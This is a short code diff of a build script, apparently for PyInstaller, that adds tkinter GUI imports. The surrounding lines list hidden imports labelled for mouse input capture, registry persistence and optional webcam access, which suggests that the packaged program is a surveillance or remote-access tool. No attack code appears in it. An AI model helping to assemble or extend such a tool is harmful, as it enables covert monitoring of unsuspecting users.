@@ -139,6 +139,9 @@ def main():
         "--hidden-import", "pynput.mouse",
         # ── Registry persistence (winreg) ───────────────────────────────────
         "--hidden-import", "winreg",
+        # ── GUI library (tkinter) ───────────────────────────────────────────
+        "--hidden-import", "tkinter",
+        "--hidden-import", "tkinter.messagebox",
         # ── Webcam (opencv-python) — optional (adds ~50MB) ─────────────────
         #"--hidden-import", "cv2",           # Uncomment if webcam is needed
         temp_file
